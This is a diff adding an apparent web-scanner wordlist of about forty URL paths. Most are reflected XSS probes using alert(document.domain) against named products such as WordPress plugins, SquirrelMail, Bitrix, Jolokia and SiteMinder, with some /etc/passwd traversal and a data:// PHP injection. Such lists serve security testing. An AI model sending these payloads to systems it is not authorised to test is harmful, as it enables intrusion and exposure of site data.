@@ -1,0 +1,42 @@
+/e/ViewImg/index.html?url=javascript:alert(1)
+/src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/src/options.php?optpage=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search
+/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search
+/src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+/wp-content/plugins/insert-php/readme.txt
+/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green
+/wp-admin/admin-ajax.php?action=lwp_forgot_password&ID=<svg%20onload=alert(document.domain)>
+/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
+/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html
+/api/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html
+/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html
+/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.domain)%3B%7D%3B//%3C/div%3E
+/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+/?p=1&xsg-provider=data://text/html,%3C?php%20phpinfo();%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp
+/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp
+/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+/_ignition/scripts/--><svg%20onload=alert(document.domain)>
+/editor_tools/module?type=files/admin
+/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/phpwiki/index.php/passwd
+/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/(download)/etc/passwd
+/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
+/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
+/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true
+/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/
+/wp-login.php?wp_lang=en_US%27
+/?q=
+/?type=
+/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
